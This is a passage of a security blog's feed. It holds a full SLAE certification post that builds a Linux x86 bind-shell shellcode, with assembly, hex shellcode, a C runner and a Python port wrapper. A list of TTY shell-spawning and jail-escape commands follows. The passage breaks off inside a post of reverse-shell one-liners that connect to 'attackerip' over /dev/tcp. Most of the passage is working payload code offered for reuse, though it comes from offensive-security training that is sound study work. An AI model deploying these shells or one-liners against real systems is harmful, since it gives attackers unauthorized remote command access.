&lt;p&gt;&lt;img src=&quot;/assets/asn-2-connect-back-network-machine.PNG&quot; alt=&quot;Reverse Shell Network Machine&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we are done :)&lt;/p&gt;

&lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/&quot;&gt;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Student ID: &lt;strong&gt;SLAE-933&lt;/strong&gt;&lt;/p&gt;
</content>

 </entry>
 
 <entry>
   <title>SLAE Assignment 1 - Shell Bind TCP (Linux/x86)</title>
   <link href="http://localhost:4000/2017/07/27/slae-x86-assignment-1-shell-bind-tcp-shellcode/"/>
   <updated>2017-07-27T00:00:00+04:00</updated>
   <id>http://localhost:4000/2017/07/27/slae-x86-assignment-1-shell-bind-tcp-shellcode</id>
   <content type="html">&lt;blockquote&gt;
  &lt;p&gt;The &lt;strong&gt;SecurityTube Linux Assembly Expert (SLAE)&lt;/strong&gt; aims to teach the basics
 of assembly language on the Linux platform from a security perspective and
 its application to writing shellcode, encoders, decoders and crypters, among
other things.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The exam style of &lt;a href=&quot;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/&quot;&gt;SecurityTube Linux Assembly Expert (SLAE)&lt;/a&gt;
is bit different. You have to complete 7 assignments of varying difficulty and post
it on your blog. Also, store the source code and all other helper scripts that
you have used in your GitHub account.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;The source code of all the files I have written for completing the assignments are available in my &lt;a href=&quot;https://github.com/ub3rsick/SLAE-x86-Assignments&quot;&gt;GitHub&lt;/a&gt; account.&lt;/p&gt;

&lt;h3 id=&quot;assignment-1-shell-bind-tcp-shellcode-linuxx86&quot;&gt;Assignment #1: Shell Bind TCP Shellcode (Linux/x86)&lt;/h3&gt;

&lt;p&gt;The following are the criteria:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Binds to a port&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Execs Shell on incoming connection&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Port number should be easily configurable&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I will be writing a python wrapper which takes in a port number and spits out the entire shellcode which binds shell to given port. So, here is how we are going to do this:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Create a socket with SYS_SOCKET&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Bind the socket to an address/port using SYS_BIND&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Listen for incoming connections using SYS_LISTEN&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Accept connection using SYS_ACCEPT&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Redirect stdin, stdout, stderr with SYS_DUP2&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Exec /bin/sh with SYS_EXECVE&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Before we start, we need to know how we can issue calls to SYS_SOCKET, SYS_BIND etc. For this we can use SYS_SOCKETCALL. The below information is from the linux man page.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;int socketcall(int call, unsigned long *args);
//socketcall - socket system calls
//call determines which socket function to invoke
//args points to a block containing the actual arguments, which are passed through to the appropriate call.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The system call number for sys_socketcall is specified in the below header file.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;/usr/include/i386-linux-gnu/asm/unistd_32.h
#define __NR_socketcall     102
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;creating-a-socket-with-sys_socket&quot;&gt;Creating a socket with SYS_SOCKET&lt;/h3&gt;

&lt;p&gt;To create a socket we need to call sys_socket via sys_socketcall.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;int socket(int domain, int type, int protocol); 
    ; [/usr/include/linux/net.h] 
    ; [#define SYS_SOCKET 1] [sys_socket(2)]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The parameters for sys_socket call are as follows:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;domain  = AF_INET   
        ; [/usr/include/i386-linux-gnu/bits/socket.h] 
        ; [#define AF_INET PF_INET]
        ; [#define PF_INET 2]
        ; [IP protocol family]   

type    = SOCK_STREAM   
        ; [/usr/include/i386-linux-gnu/bits/socket.h]
        ; [SOCK_STREAM = 1]
        ; [Sequenced, reliable, connection-based byte streams]

protocol= IP_PROTO  
        ; [/usr/include/linux/in.h] 
        ; [IPPROTO_IP = 0]
        ; [Dummy protocol for TCP]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, the call to sys_socket will be like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;sockfd = sys_socket(2, 1, 0)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once the call is completed successfully, the socket file descriptor will be saved in EAX. Converting this into assembly:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;        ; EAX = 0x66 = 102      ; sys_socketcall()
        ; EBX = 0x1             ; sys_socket()
        ; ECX = Pointer to sys_socket arguments

        xor eax, eax
        push eax                ; Argument 3 for socket() =&amp;gt;    IPPROTO_IP = 0
        mov al, 0x66
        
        push byte 0x1               
        pop ebx                 ; clear EBX and store 0x1 in EBX
        push byte 0x1           ; Argument 2 for socket() =&amp;gt;    SOCK_STREAM = 1
        push byte 0x2           ; Argument 1 for socket() =&amp;gt;    AF_INET = 2 
        
        ; Now we have arguments for sys_socket() in the stack. ESP points to them.
        
        mov ecx, esp			; Pointer to sys_socket args
        int 0x80                ; returns socket file descriptor to EAX
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;binding-the-socket-to-addressport-with-sys_bind&quot;&gt;Binding the socket to address/port with SYS_BIND&lt;/h3&gt;

&lt;p&gt;Now that we have created a socket, we need to bind it with address/port. We can use SYS_BIND for this purpose. The system call number for SYS_BIND is defined in the below header file.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[/usr/include/linux/net.h]
[#define SYS_BIND 2] [sys_bind(2)]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The man page entry for Bind is as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);	
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bind takes three arguments and among them &lt;code&gt;struct sockaddr *addr&lt;/code&gt; is  the one that we need to pay more attention. The definition for &lt;code&gt;sockaddr&lt;/code&gt; can be found in &lt;code&gt;[/usr/include/linux/in.h]&lt;/code&gt; header file.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/* Structure describing an Internet (IP) socket address. */
#define __SOCK_SIZE__	16		/* sizeof(struct sockaddr)	*/
struct sockaddr_in {
	  __kernel_sa_family_t	sin_family;		/* Address family		*/
	  __be16		sin_port;		/* Port number			*/
		struct in_addr	sin_addr;		/* Internet address		*/

		/* Pad to size of `struct sockaddr'. */
		unsigned char		__pad[__SOCK_SIZE__ - sizeof(short int) -
							sizeof(unsigned short int) - sizeof(struct in_addr)];
		};
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We will define this structure first as we require a pointer to it. Lets look at the different members of the structure.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sin_family = 2		; AF_INET
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The port number should be converted to network endian. We can use python for that. I am using port 4321 for my bind shell.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ python -c 'import socket as s;port = s.htons(4321);print &quot;port 4321 =&amp;gt; &quot;,port,hex(port)'
port 4321 =&amp;gt;  57616 0xe110
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The network endian equivalent of port 4321 is 57616 and corresponding hex value 0xe110.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sin_port = 0xe110
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The next one &lt;code&gt;sin_addr&lt;/code&gt; our desired value is defined in &lt;code&gt;/usr/include/linux/in.h&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#define INADDR_ANY ((unsigned long int) 0x00000000) ;
/* Address to accept any incoming messages. */

sin_addr = 0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;With the above information, our call to bind should be like this.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bind(sockfd, *ptr-&amp;gt;[2, 57616, 0], 16)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So the assembly code becomes:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;		; EAX = 0x66 = sys_socketcall()
		; EBX = 0x2  = sys_bind()
		; ECX = pointer to arguments of sys_bind

		; EAX has the socketfd, we need to save it somewhere for later use.

		pop ebx				; EBX = 2
		pop esi				; Clears ESI, also the stack now has our required value for sin_addr = 0
		xchg esi, eax			; sockfd is now in esi
		
		mov al, 0x66			; sys_socketcall()
		push word 0xe110		; push sin_port = hex(htons(4321))
		push word bx			; push sin_family = AF_INET = 2
		
		; now stack has (from top) -&amp;gt; [2, 0xe110, 0]
		; ESP points to this structure
		; save it in ECX
		
		mov ecx, esp
		
		push 0x10				; addrlen = 16
		push ecx				; pointer to sockaddr
		push esi				; sockfd

		mov ecx, esp			; Pointer to bind args

		int 0x80
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;listen-for-incoming-connections-using-sys_listen&quot;&gt;Listen for incoming connections using SYS_LISTEN&lt;/h3&gt;
&lt;p&gt;At this moment we have a socket bound to a port and we want to listen that port with SYS_LISTEN. The man page entry for listen is as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;int listen(int sockfd, int backlog);
// backlog = size of the connection queue
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The system call number for &lt;code&gt;sys_listen&lt;/code&gt; is defined in &lt;code&gt;/usr/include/linux/net.h&lt;/code&gt; header file.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#define SYS_LISTEN 4 	/* sys_listen(2)*/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;With this information lets write this into assembly.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;		; EAX = 0x66 				; sys_socketcall()
		; EBX = 0x4				; sys_listen()
		; ECX = pointer to args of sys_listen

		mov al, 0x66				; sys_socketcall()
		mov bl, 0x4				; sys_listen()
		
		xor edi, edi
		push edi				; backlog = 0
		
		push esi				; ESI still has our socketfd
		mov ecx, esp

		int 0x80
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;accept-connection-using-sys_accept&quot;&gt;Accept connection using SYS_ACCEPT&lt;/h3&gt;
&lt;p&gt;The port 4321 must be open on our system after sys_listen, now we need to accept the incoming connection using SYS_ACCEPT. The man page entry for accept is as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The system call number for &lt;code&gt;sys_accept&lt;/code&gt; is defined in &lt;code&gt;/usr/include/linux/net.h&lt;/code&gt; header file as:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#define SYS_ACCEPT 5 	/* sys_accept(2)*/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;When accepting a new connection we do not want any information regarding the client. So, referring to the man page:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;When addr is NULL, nothing is filled in; in this case, addrlen is not used, and should also be NULL.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So the call to sys_accept() goes like this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sys_accept(sockfd, 0, 0)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The assembly code becomes:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;		; EAX = 0x66			; sys_socketcall()
		; EBX = 0x5			; sys_accept()
		; ECX = Pointer to args of sys_accept()

		mov al, 0x66			; sys_socketcall()
		inc ebx				; EBX is 4, so just add 1 to it = 5;  sys_accept()
		
		push edi			; addrlen = EDI = 0
		push edi			; addr	  = EDI = 0
		push esi			; ESI has our sockfd
		mov ecx, esp
		
		int 0x80
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;redirect-stdin-stdout-stderr-with-sys_dup2&quot;&gt;Redirect stdin, stdout, stderr with SYS_DUP2&lt;/h3&gt;
&lt;p&gt;Now that we are connected to the client, we need to redirect &lt;code&gt;stdin, stdout, stderr&lt;/code&gt; to the client socket file descriptor.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;stdin 	= 0
stdout 	= 1
stderr 	= 2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The man page entry for &lt;code&gt;dup2&lt;/code&gt; is as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;int dup2(int oldfd, int newfd);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;oldfd&lt;/code&gt; is our client socket file descriptor and newfd is &lt;code&gt;stdin, stdout, stderr&lt;/code&gt;. So, we need to call dup2 as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;dup2(clientfd, 0)
dup2(clientfd, 1)
dup2(clientfd, 2)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As of now, register EAX has the client socket file descriptor. It should be moved to EBX. The system call number for &lt;code&gt;sys_dup2&lt;/code&gt; is &lt;code&gt;0x3f&lt;/code&gt; and this value should be moved in to EAX for each &lt;code&gt;dup2&lt;/code&gt; call. The assembly code becomes:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;		
        ;EXA 	= 0x3f
        ;EBX	= oldfd	= clientfd
        ;ECX	= newfd	= 0, 1, 2

		xchg ebx,eax				; save the clientfd in ebx
		
        	xor eax, eax
		xor ecx, ecx
		mov cl,0x2

		dup_loop:
			mov al, 0x3f			; sys_dup2()
			int 0x80
			dec ecx				; 2, 1, 0
			jns dup_loop			; loop until SF is set
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;exec-binsh-with-sys_execve&quot;&gt;Exec /bin/sh with SYS_EXECVE&lt;/h3&gt;
&lt;p&gt;Finally, we need to execute a &lt;code&gt;/bin/sh&lt;/code&gt;shell with &lt;code&gt;sys_execve&lt;/code&gt; system call. The man page entry for &lt;code&gt;execve()&lt;/code&gt; is as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;int execve(const char *filename, char *const argv[], char *const envp[]);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The assembly code is as follows:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;		
        ; EAX	= 0xb		; sys_execve()
        ; EBX	= pointer to /bin/sh null terminated
        ; ECX	= pointer to address of /bin/sh null terminated
		; EDX	= pointer to an empty array
		
		xor eax, eax
		push eax				; push first 4 null bytes onto stack
			

		; //bin/sh (8)
		push 0x68732f2f
		push 0x6e69622f
							; stack contents from top - //bin/sh 0x00000000
		mov ebx, esp				; EBX has address of //bin/sh null terminated

		push eax				; push another 4 null bytes
        						; stack contents from top - 0x00000000 //bin/sh 0x00000000
        
		mov edx, esp				; now EDX has the address of the 4 null bytes that we just pushed
        
		push ebx				; stack contents from top
        						; addr_of_/bin/sh 0x00000000 //bin/sh 0x00000000

		mov ecx, esp

		mov al, 0xb
		int 0x80
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;complete-shellcode&quot;&gt;Complete Shellcode&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-nasm&quot;&gt;;
; Author 		: Rizal Muhammed (UB3RSiCK)
; Description		: SLAE x86 Assignment 1 - Shell Bind TCP Shellcode (Linux/x86)
; File 			: shell-bind-tcp-x86.nasm
; Website		: https://ub3rsick.github.io/

global _start

section .text

	_start:
		; int socketcall(int call, unsigned long *args)
		; int socket(int domain, int type, int protocol); 
		; sockfd = socket(2, 1, 0)

		; EAX = 0x66 			; sys_socketcall()
		; EBX = 0x1			; sys_socket()
		; ECX = Pointer to sys_socket arguments

		xor eax, eax
		push eax			; Argument 3 for socket() =&amp;gt;  	IPPROTO_IP = 0
		mov al, 0x66
		
		push byte 0x1			; Argument 2 for socket() =&amp;gt; 	SOCK_STREAM = 1	
		pop ebx
		push byte 0x1
		
		push byte 0x2			; Argument 1 for socket() =&amp;gt; 	AF_INET	= 2	
		
		; Now we have arguments for socket() in the stack. ESP points to them.
		
		mov ecx, esp
		int 0x80			; returns socket file descriptor to EAX

		;********************************************************************************;

		; Binding socket to port.		
		; Now that we have a socket, we need to bind it to a port.
		;	
		; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);	

		; EAX = 0x66 = sys_socketcall()
		; EBX = 0x2  = sys_bind()
		; ECX = pointer to arguments of sys_bind

		; EAX has the socketfd, we need to save it somewhere for later use.

		pop ebx			; EBX = 2
		pop esi			; Clears ESI also the stack now has our required value for sin_addr = 0

			; sin_addr = 0; will now be on stack from earlier push
			;#define INADDR_ANY ((unsigned long int) 0x00000000) ;
		
		xchg esi, eax			; sockfd is now in esi
		
		mov al, 0x66
		push word 0xe110		; push sin_port = hex(htons(4321))
		push word bx			; push sin_family = AF_INET = 2
		
		; now stack has (from top) -&amp;gt; [2, 0xe110, 0]
		; ESP points to this structure
		; save it in ECX
		
		mov ecx, esp
		
		push 0x10			; addrlen = 16
		push ecx			; pointer to sockaddr
		push esi			; sockfd

		mov ecx, esp			; Pointer to bind args

		int 0x80
		
		;********************************************************************************;

		; listen to the port
		; int listen(int sockfd, int backlog);

		; EAX = 0x66 	; sys_socketcall()
		; EBX = 0x4	; sys_listen()
		; ECX = pointer to args of sys_listen

		mov al, 0x66
		mov bl, 0x4
		
		xor edi, edi
		push edi		; backlog = 0
		
		push esi		; ESI still has our socketfd
		mov ecx, esp

		int 0x80

		;********************************************************************************;
		; Accept connections with sys_accept
		
		; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
		; we dont want any information regarding the client. So, from the man page of accept : 
		; When addr is NULL, nothing is filled in; in this case, addrlen is not used, and should also be NULL.
		
		; EAX = 0x66		; sys_socketcall()
		; EBX = 0x5		; sys_accept()
		; ECX = Pointer to args of sys_accept()


		mov al, 0x66
		inc ebx
		
		push edi		; addrlen = EDI = 0
		push edi		; addr	  = EDI = 0
		push esi		; ESI has our sockfd
		mov ecx, esp
		
		int 0x80

	
		;********************************************************************************;
		; Redirect srdin, stdout, stderr with sys_dup2
		; int dup2(int oldfd, int newfd);
		; sys_dup2 = 0x3f

		;EAX 	= 0x3f
	        ;EBX	= oldfd	= clientfd
       		;ECX	= newfd	= 0, 1, 2

		xchg ebx,eax		; save the clientfd in ebx
		
	        xor eax, eax
		xor ecx, ecx
		mov cl,0x2

		dup_loop:
			mov al, 0x3f		; sys_dup2()
			int 0x80
			dec ecx			; 2, 1, 0
			jns dup_loop		; loop until SF is set

		;********************************************************************************;
		; execve /bin/sh
		
		; EAX	= 0xb		; sys_execve()
	    	; EBX	= pointer to /bin/sh null terminated
      		; ECX	= pointer to address of /bin/sh null terminated
		; EDX	= pointer to an empty array
		
		xor eax, eax
		push eax				; push first 4 null bytes onto stack
			

		; //bin/sh (8)
		push 0x68732f2f
		push 0x6e69622f
							; stack contents from top - //bin/sh 0x00000000
		mov ebx, esp				; EBX has address of //bin/sh null terminated

		push eax				; push another 4 null bytes
        						; stack contents from top - 0x00000000 //bin/sh 0x00000000
        
		mov edx, esp				; now EDX has the address of the 4 null bytes that we just pushed
        
		push ebx				; stack contents from top
        						; addr_of_/bin/sh 0x00000000 //bin/sh 0x00000000

		mov ecx, esp

		mov al, 0xb
		int 0x80
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Assembling and linking assembly code.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nasm -f elf32 shell-bind-tcp-x86.nasm -o shell-bind-tcp-x86.o
ld shell-bind-tcp-x86.o -o shell-bind-tcp-x86
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Dumping shellcode from the executable.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;objdump -d ./shell-bind-tcp-x86|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/&quot;/'|sed 's/$/&quot;/g'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/assets/asn-1-asbmle-link-dump-shellcode.PNG&quot; alt=&quot;Assemble, Link and Dump Shellcode&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;string.h&amp;gt;

unsigned char code[] = \
&quot;\x31\xc0\x50\xb0\x66\x6a\x01\x5b\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x5b\x5e\x96\xb0\x66\x66\x68\x10\xe1\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x31\xff\x57\x56\x89\xe1\xcd\x80\xb0\x66\x43\x57\x57\x56\x89\xe1\xcd\x80\x93\x31\xc0\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;
main()
{
        printf(&quot;Shellcode Length:  %d\n&quot;, strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Compiling with gcc.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc shellcode.c -o shell-bind-tcp -fno-stack-protector -z execstack
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/assets/asn-1-compile-and-run.PNG&quot; alt=&quot;Compile and Run&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;configuring-port&quot;&gt;Configuring Port&lt;/h3&gt;
&lt;p&gt;Below is the python wrapper that takes in port number as argument and spits out the entire shellcode.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/env python

'''
Author 	: RIZAL MUHAMMED (UB3RSiCK)
Desc	: port-config-shell-bind-tcp.py
'''

import socket
import sys

if len(sys.argv) != 2:
	print &quot;Usage: {} Port&quot;.format(sys.argv[0])
	sys.exit()

port = int(sys.argv[1])

# Check if user has passed invalid port number
if port &amp;lt; 1000 or port &amp;gt; 65535 :
	print &quot;Either port number less than 1000: user needs to be root&quot;
	print &quot;Or&quot;
	print &quot;Port number greater than 65535&quot;
	sys.exit()

hex_port = hex(port)[2:]

if len(hex_port) &amp;lt; 4:
	# for all port number &amp;gt; 1000, len(hex(port)) will be 3 or more, not less than that
	hex_port = &quot;0&quot; + hex_port

h1 = hex_port[:2]
h2 = hex_port[2:]

if h1 == &quot;00&quot; or h2 == &quot;00&quot;:
	print &quot;port number contain null byte, please choose different port number&quot;
	sys.exit()


port_no = '\\x'+h1+'\\x'+h2

print 'Port: {0} , Hex = {1}, inShellcode = {2}'.format(port, hex_port, port_no)

shellcode = (
	&quot;\\x31\\xc0\\x50\\xb0\\x66\\x6a\\x01\\x5b\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x5b\\x5e\\x96\\xb0\\x66\\x66\\x68&quot;+
	port_no+	# this is the place where we need to place our port number
	&quot;\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x31\\xff\\x57\\x56\\x89\\xe1\\xcd&quot;+
	&quot;\\x80\\xb0\\x66\\x43\\x57\\x57\\x56\\x89\\xe1\\xcd\\x80\\x93\\x31\\xc0\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49&quot;+
	&quot;\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1&quot;+
	&quot;\\xb0\\x0b\\xcd\\x80&quot;)

print '&quot;'+shellcode+'&quot;'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Running the python wrapper script.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/asn-1-port-python-wrapper-out.PNG&quot; alt=&quot;Port Config Python Wrapper&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Insert the shellcode in the template file and compile.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/asn-1-port-config-shellcode-run.PNG&quot; alt=&quot;Run Custom Port Shellcode&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we are done :)&lt;/p&gt;

&lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/&quot;&gt;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Student ID: &lt;strong&gt;SLAE-933&lt;/strong&gt;&lt;/p&gt;
</content>

 </entry>
 
 <entry>
   <title>Spawning a TTY Shell</title>
   <link href="http://localhost:4000/2017/07/27/Spawning-TTY-Shell/"/>
   <updated>2017-07-27T00:00:00+04:00</updated>
   <id>http://localhost:4000/2017/07/27/Spawning-TTY-Shell</id>
   <content type="html">&lt;p&gt;Often during pen tests you may obtain a shell without having tty, yet wish to
interact further with the system. Here are some commands which will allow you to
spawn a tty shell. Obviously some of this will depend on the system environment
and installed packages.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Shell Spawning&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;echo os.system('/bin/bash')
&lt;/code&gt;&lt;/pre&gt;
&lt;!-- more --&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;/bin/sh -i
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-perl&quot;&gt;perl —e 'exec &quot;/bin/sh&quot;;'
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-perl&quot;&gt;perl: exec &quot;/bin/sh&quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-ruby&quot;&gt;ruby: exec &quot;/bin/sh&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;lua: os.execute('/bin/sh')
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From within IRB - Interactive Ruby Shell&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-ruby&quot;&gt;exec &quot;/bin/sh&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From within vi&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;:!bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From within vi&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;:set shell=/bin/bash:shell
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From within nmap (nmap –interactive)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;!sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Many of these will also allow you to escape jail shells.&lt;/p&gt;

&lt;p&gt;Original Post: &lt;a href=&quot;http://netsec.ws/?p=337&quot;&gt;NETSEC - Spawning a TTY shell&lt;/a&gt;&lt;/p&gt;
</content>

 </entry>
 
 <entry>
   <title>Reverse Shell One Liners</title>
   <link href="http://localhost:4000/2016/09/01/reverse-shell-one-liners/"/>
   <updated>2016-09-01T00:00:00+04:00</updated>
   <id>http://localhost:4000/2016/09/01/reverse-shell-one-liners</id>
   <content type="html">&lt;p&gt;There might be several occasions where you might have code execution on a target machine and you sit there wondering what to do next.&lt;/p&gt;

&lt;p&gt;Well here is what you can do. Setup &lt;strong&gt;netcat&lt;/strong&gt; listener on port &lt;strong&gt;4444&lt;/strong&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nc -nvlp 4444
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Bash&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;exec /bin/bash 0&amp;amp;0 2&amp;gt;&amp;amp;0

0&amp;lt;&amp;amp;196;exec 196&amp;lt;&amp;gt;/dev/tcp/attackerip/4444; sh &amp;lt;&amp;amp;196 &amp;gt;&amp;amp;196 2&amp;gt;&amp;amp;196

exec 5&amp;lt;&amp;gt;/dev/tcp/attackerip/4444
cat &amp;lt;&amp;amp;5 | while read line; do $line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done  # or:
